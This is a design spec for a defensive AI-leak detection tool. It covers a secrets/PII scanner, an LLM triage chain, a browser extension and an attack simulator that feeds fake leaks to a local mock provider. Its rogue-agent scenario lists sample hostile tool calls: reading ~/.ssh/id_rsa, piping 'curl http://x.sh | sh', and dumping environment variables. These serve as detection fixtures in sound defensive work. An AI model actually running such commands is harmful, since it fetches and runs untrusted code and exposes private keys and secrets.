# 02 — PART B SPEC · Detection, Intelligence & Attack Simulator
**Owner:** Aaraadhyaa's Mac · **Tool:** Claude Code · **Branch:** `aaraadhyaa/detection-intel`
**Owns:** `detector/`, `simulator/`, `extension/`, `docs/detector.md`, `docs/simulator.md`, `docs/progress/aaraadhyaa.md`
**Read first:** `docs/specs/00_MASTER_SPEC.md` (§6 models, §8 rules are binding).

You build the brain and the demo engine:
1. `shadowscope_detect` — a pure-Python, dependency-light detection library that Part A imports, plus a CLI.
2. The **LLM triage engine** (Featherless → Groq → Ollama → rules), privacy-safe.
3. The **attack simulator** (`simulator/`) — mock AI provider, 8+ realistic leak / rogue-agent scenarios,
   sample HAR/PCAP/JSONL files. It produces real localhost traffic that Part A's collectors catch.
4. The **"Shadow Sensor" browser extension** for Chrome + Edge.

You never wait for Part A: the simulator talks to the backend only over HTTP (§B6 contract) and the
detector is a plain Python package.

---

## B1. Layout

```
detector/
├── pyproject.toml                # name: shadowscope-detect, py>=3.11, deps: httpx ; dev: pytest
├── CLAUDE.md
├── shadowscope_detect/
│   ├── __init__.py               # public API exactly as spec 01 §A9 (+ __version__) — FROZEN signatures
│   ├── types.py                  # TypedDicts: DetFinding, Evidence, AgentAction, TriageResult...
│   ├── patterns/
│   │   ├── secrets.py            # master §8.1 table as data (id, regex, severity, validator, remediation, compliance)
│   │   ├── pii.py                # master §8.2
│   │   ├── agent.py              # master §8.4 command & path rules, dangerous tool regex
│   │   └── providers_proc.py     # AI process signatures (master §7 bottom)
│   ├── validators.py             # luhn, verhoeff, pan structure, jwt decode (no verify), iin prefixes
│   ├── entropy.py                # shannon, charset classification, candidate tokenizer
│   ├── code_detect.py            # source-code & proprietary-code heuristics
│   ├── redact.py                 # mask: keep first 4 + last 2, rest '•'; emails a•••@d•••.com; aadhaar XXXX XXXX 1234
│   ├── scanner.py                # scan_text orchestration, dedupe overlapping matches, scoring
│   ├── agent_analyzer.py         # tool-call parsers (OpenAI/Anthropic/Ollama/ReAct/AutoGPT), autonomy helpers
│   ├── classify.py               # classify_process
│   ├── remediation.py            # per-subtype remediation + compliance mapping table
│   ├── triage/
│   │   ├── engine.py             # async triage(): chain featherless → groq → ollama → rules
│   │   ├── prompts.py            # system prompt + JSON schema instructions
│   │   └── rules.py              # deterministic TriageResult builder
│   └── cli.py                    # `shadowscope-scan <path|-> [--json] [--fail-on high]`
├── tests/
│   ├── fixtures/                 # leaky .env, customer.csv, agent_openai.json, agent_anthropic.json, react.txt, clean texts
│   └── test_*.py
└── bench.py                      # throughput benchmark (target ≥ 5 MB/s on regex pass)
simulator/
├── README.md
├── requirements.txt              # fastapi, uvicorn, httpx, scapy (only for PCAP crafting)
├── mock_provider.py              # :8788 fake OpenAI/Anthropic/Ollama API incl. tool_calls
├── fakes.py                      # fake-but-valid secrets, Verhoeff-valid Aadhaar, Luhn cards, Indian PII
├── scenarios/                    # one module per scenario + registry (id, name, description, icon, severity, tags)
├── run.py                        # CLI: python -m simulator.run <scenario_id> [--intensity 2] | --list --json
├── make_samples.py               # writes samples/demo.har, demo.pcap, agent_session.jsonl, leaky.log
└── samples/
extension/
├── manifest.json                 # MV3, Chrome + Edge
├── src/content.js  src/scanner.js  src/background.js  src/popup.html  src/popup.js  src/styles.css
├── icons/
└── README.md                     # load-unpacked instructions (Chrome + Edge)
```

## B2. `scan_text` behaviour
1. Run all secret + PII regexes (compiled once, module-level). Each match → candidate with offset/line.
2. Validators: Luhn (+IIN) for cards, Verhoeff for Aadhaar, PAN 4th-char entity check, JWT base64 decode
   (add `alg`, `exp`, `iss`, `sub` to description; expired JWT → severity medium).
3. Entropy pass on remaining tokens (split on whitespace/quotes/`=`/`:`/`,`), master §8.1 thresholds.
   Ignore: UUIDs (info only if in key context), git SHAs in "commit" context, base64 images (`data:image`).
4. Code detection (§8.3), canary tokens (from `policy["canary_tokens"]`).
5. Resolve overlaps (keep the most specific / highest severity). Bulk rules: ≥5 emails or ≥3 Aadhaar/PAN →
   extra `bulk_pii` finding high.
6. Each DetFinding: `type, subtype, severity, confidence, title, description, evidence{redacted_snippet (±40 chars
   context, redacted), match_redacted, entropy, line, offset, fingerprint=sha256(match)[:12]}, detector,
   compliance[], remediation[]`.
7. `risk_score` for the text = min(100, Σ severity weights with diminishing returns) (master §9 weights).
8. `redacted_text` = full text with every match masked. **Raw matches never leave this function.**
Target: 1 MB text < 400 ms.

## B3. `analyze_agent_payload`
- Accept OpenAI / Anthropic / Ollama JSON request or response bodies, or raw text (ReAct / AutoGPT JSON).
- Extract: tools declared, tool calls made (name + arguments), framework guess (markers: "Action Input:",
  "Thought:", "langchain", "crewai", AutoGPT `"command": {"name"` …).
- For each tool call: classify arguments with §8.4 command/path rules → `AgentAction{kind, detail(redacted),
  severity, verified:false, tool_name}` + findings (`destructive_command`, `remote_code_exec`, `sensitive_file_read`,
  `data_exfil_command`, `privilege_escalation`, `persistence`, `recon`, `unverified_tool_call`).
- Permissions inferred from declared tools → `{shell, filesystem_read, filesystem_write, network, internal_api, code_exec}`.
- Also run `scan_text` on tool arguments/results. Helper `autonomy_score(timestamps, tool_calls, dangerous_ratio) -> int`.

## B4. LLM triage (Featherless suggested usage)
`async triage(finding, context_snippet, engine_cfg)`:
- **Always** run `redact()` first; re-scan the outgoing text — if any secret/PII survives, mask harder.
  Put the redacted text in `redacted_input_preview`.
- Engine chain `auto`: Featherless (`FEATHERLESS_API_KEY`, `FEATHERLESS_MODEL`) → Groq (`GROQ_API_KEY`,
  `llama-3.1-8b-instant`) → Ollama (`OLLAMA_URL`, `llama3.2:3b`) → rules. 12 s timeout each; OpenAI-compatible
  `/chat/completions`; header `X-ShadowScope-Self: 1`.
- Strict JSON output matching TriageResult; robust parsing (strip fences, first `{`..last `}`), validation,
  rules fallback; LRU cache keyed by (subtype, fingerprint).
- Rules engine: remediation.py + false-positive heuristics (`sk_test_`, "example", "dummy", "xxxx" → likely_false_positive).

## B5. CLI
`shadowscope-scan path/or/glob [--json] [--fail-on high]` — scans files/dirs (skip binaries, node_modules, .git),
ANSI table, exit 1 when findings ≥ threshold; `.pre-commit-hooks.yaml` ("shift-left" bonus feature).

## B6. Attack simulator (demo engine) — NEVER sends fake secrets to real external hosts
**Contract with Part A (HTTP only, no imports):**
- Scenarios send their AI requests to **localhost** targets (mock provider :8788 with `Host: api.openai.com` etc.,
  or real Ollama :11434) so Part A's loopback collector can capture them.
- **Always** also report each request through `POST http://localhost:8787/api/observations` (body = `Observation`,
  master §6) with `source: "simulator"` — this guarantees the demo works even when packet sniffing isn't available.
  If the backend is down, print the observation and continue (never crash).
- `python -m simulator.run --list --json` prints the scenario registry as JSON `Scenario[]` (master §6).
  Part A's `/api/scenarios` and `/api/simulate` call this CLI as a subprocess.

`mock_provider.py` (FastAPI :8788): `/v1/chat/completions`, `/v1/messages`, `/api/chat`, `/api/generate`; plausible
replies; for agent scenarios returns tool calls (OpenAI `tool_calls`, Anthropic `tool_use`).

| id | name | what it does | expected findings |
|---|---|---|---|
| shadow_saas_sweep | Shadow SaaS sweep | real TLS connects (GET `/v1/models`, **no key**) to api.openai.com, api.anthropic.com, generativelanguage.googleapis.com, api.groq.com, huggingface.co — metadata only; observation has no body | shadow_ai ×5 |
| env_file_leak | Developer pastes .env | .env with fake AWS/OpenAI/Stripe/DB URL → mock provider (Host api.openai.com) | secrets ×4 critical |
| customer_pii_dump | Customer CSV to chatbot | 20 fake Indian customers (Verhoeff Aadhaar, PAN, +91, UPI, emails) → Ollama if running else mock | bulk pii, DPDP |
| proprietary_code | Proprietary code review | "CONFIDENTIAL – Acme Pvt Ltd" Python module with hardcoded JWT → mock Anthropic `/v1/messages` | proprietary_code, jwt |
| rogue_agent | Rogue LangChain agent | 8-step ReAct loop at machine speed; mock returns tool calls `read_file ~/.ssh/id_rsa`, `shell: curl http://x.sh \| sh`, `shell: env`, `http_request internal-api.corp/admin`; spawns harmless child `sh -c "echo shadowscope-demo"` | agent_action ×5, shell_spawn, autonomous_loop |
| canary_trip | Honeytoken tripped | sends the first policy canary token (GET `/api/policies`, fallback `CANARY-SS-7F3A9`) | canary critical |
| gateway_block | Gateway blocks a leak | sends the .env leak through `http://localhost:8789/openai/v1/chat/completions` (Part A's gateway) | 403 blocked + finding |
| exfil_spike | Exfiltration volume spike | 40 rapid 200 KB payloads from one process | exfil_volume |
| local_llm_chat | Real local Ollama chat | real request to Ollama :11434 with an email + internal hostname | pii low/medium |

`make_samples.py` builds `samples/demo.har`, `samples/demo.pcap` (scapy-crafted HTTP on loopback ports + a TLS
ClientHello with SNI), `samples/agent_session.jsonl`, `samples/leaky.log` from the same scenarios.
`simulator/demo_sequence.py` runs all scenarios with 4 s gaps in this order: shadow_saas_sweep, env_file_leak,
customer_pii_dump, proprietary_code, rogue_agent, canary_trip, gateway_block, exfil_spike.

## B7. Browser extension (Chrome + Edge, MV3) — "Shadow Sensor"
- Content script on: `chatgpt.com`, `chat.openai.com`, `claude.ai`, `gemini.google.com`, `copilot.microsoft.com`,
  `perplexity.ai`, `chat.deepseek.com`, `chat.mistral.ai`, `huggingface.co/chat`.
- Listens to `paste` and prompt submit; runs `scanner.js` (JS port of master §8); on findings shows a glass toast
  (Shadow DOM) with **[Redact & paste]** and **[Paste anyway]**.
- Background worker sends the **redacted** `ExtensionEvent` to `http://localhost:8787/api/extension/event`; queues
  when offline. Popup: toggle, per-site counts, engine status, "Open dashboard" → `http://localhost:5173/app`.
- Minimal permissions, no remote code, no network except localhost.

## B8. Quality bars
- ≥ 60 pytest cases (positive + negative per subtype, validators, 5 agent formats, triage with mocked httpx).
- Unit test proving no raw fixture secret ever reaches the triage HTTP layer.
- Simulator: every scenario runnable standalone; `--dry-run` prints observations without sending.
- Zero real secrets anywhere (fake values marked FAKE/EXAMPLE where the format allows).

## B9. Phase plan (prompts in `PROMPTS_B_aaraadhyaa.md`)
- **P1 (→H4):** package skeleton, types, secrets+PII patterns, validators, entropy, redaction, scanner, tests.
- **P2 (→H8):** code detection, canaries, agent analyzer, classify_process, remediation table, **LLM triage engine**.
  Push before H8 — Part A integrates the real package at checkpoint #1.
- **P3 (→H12):** simulator: fakes, mock provider, all scenarios, run CLI, samples, demo sequence + CLI `shadowscope-scan`.
- **P4 (→H14:15):** browser extension (Chrome + Edge), bench, docs/detector.md + docs/simulator.md.
